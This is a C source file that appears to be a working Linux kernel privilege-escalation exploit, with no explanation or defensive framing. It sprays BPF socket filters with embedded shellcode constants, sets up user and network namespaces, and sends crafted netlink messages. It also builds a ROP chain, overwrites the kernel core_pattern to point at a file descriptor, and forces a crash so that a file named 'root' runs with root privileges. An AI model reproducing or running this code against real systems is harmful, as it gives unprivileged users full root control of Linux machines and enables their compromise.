#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/ipc.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <err.h>
#include <sys/syscall.h>
#include <linux/aio_abi.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/sendfile.h>
#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define PAUSE           \
    {                   \
        printf(":");    \
        int x;          \
        read(0, &x, 1); \
    }
extern void foo(void *buf);
void handle(int s) {}
void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}
int cfd[2];
int sfd[0x200][2];
char payload[0x1000];
char buf[0x1000];
struct sock_filter filter[0x1000];
int stopfd[2];
int sc(void)
{
    set_cpu(1);
    unsigned int prog_len = 0x900;
    struct sock_filter table[] = {
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        {.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};

    for (int i = 0; i < prog_len; i++)
        filter[i] = table[0];

    filter[prog_len - 1] = table[1];
    int idx = prog_len - 2;

#include "sc.h"

    struct sock_fprog prog = {
        .len = prog_len,
        .filter = filter,
    };
    int fd[2];
    for (int k = 0; k < 0x10; k++)
    {
        if (fork() == 0)
        {
            close(stopfd[1]);
            for (int i = 0; i < 0x500; i++)
            {
                SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd));
                SYSCHK(setsockopt(fd[0], SOL_SOCKET, 26, &prog, sizeof(prog)));
            }
            write(stopfd[0], buf, 1);
            read(stopfd[0], buf, 1);
            exit(0);
        }
    }
    read(stopfd[1], buf, 0x10);
}
char POC[0x1000];
size_t DEL[] = {
    0x0005002900000024, 0x00000000649bcb96,
    0x0000000100000000, 0x0001000000010010,
    0x0000000000000000};
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    SYSCHK(sendfile(memfd, open("root", 0), 0, 0xffffffff));
    dup2(memfd, 666);
    close(memfd);
    while (check_core() == 0)
        sleep(1);
    *(size_t *)0 = 0;
}
void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];
    ret = unshare(CLONE_NEWNET | CLONE_NEWUSER);
    if (ret < 0)
    {
        perror("unshare");
    }
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}
size_t payment[] = {
    0x0201010100000024, 0x0000000000000000, 0x0008000800000000, 0x0015000858df0300, 0x00feffff};
int main(int argc, char **argv)
{
    if (fork() == 0)
    {
        set_cpu(1);
        strcpy(argv[0], "billy");
        while (1)
            sleep(1);
    }
    if (fork() == 0)
    {
        set_cpu(1);
        setsid();
        crash("");
    }
    setvbuf(stdout, 0, 2, 0);
    unshare_setup(getuid(), getgid());
    socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
    socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd);
    struct rlimit rlim = {
        .rlim_cur = 0xf000,
        .rlim_max = 0xf000};

    setrlimit(RLIMIT_NOFILE, &rlim);
    {
        set_cpu(1);
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        int fd = open("./ip0", O_RDONLY);
        int n = read(fd, buf, 0x1000);
        setsockopt(s, 0, 64, buf, n);
        fd = open("./ip1", O_RDONLY);
        n = read(fd, buf, 0x1000);
        setsockopt(s, 0, 65, buf, n);
        set_cpu(0);
    }
    char *core = (void *)mmap((void *)0xa00000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
    strcpy(core, "|/proc/%P/fd/666");
    int sp = socket(0x10ul, 3ul, 0xc);
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    set_cpu(1);
    sc();
    set_cpu(0);
    {
        int poc_fd = open("./POC", O_RDONLY);
        read(poc_fd, POC, 0x1000);
        write(fd, POC, 0x1000);
    }

    write(fd, DEL, 0x24);
    write(sp, payment, 0x24);
    write(sp, payment, 0x24);
    write(sp, payment, 0x24);
    write(sp, payment, 0x24);

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(80),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };

    size_t rop[0x10] = {};
    rop[0] = 0xffffffffcc000000 - 0x800;
    int c = socket(AF_INET, SOCK_DGRAM, 0);

    if (fork() == 0)
    {
        set_cpu(1);
        signal(SIGFPE, handle);
        signal(SIGTRAP, handle);
        signal(SIGSEGV, handle);
        setsid();
        foo(rop);
    }
    sleep(1);
    SYSCHK(sendto(c, buf, 0x10, 0, (void *)&addr, sizeof(addr)));
}
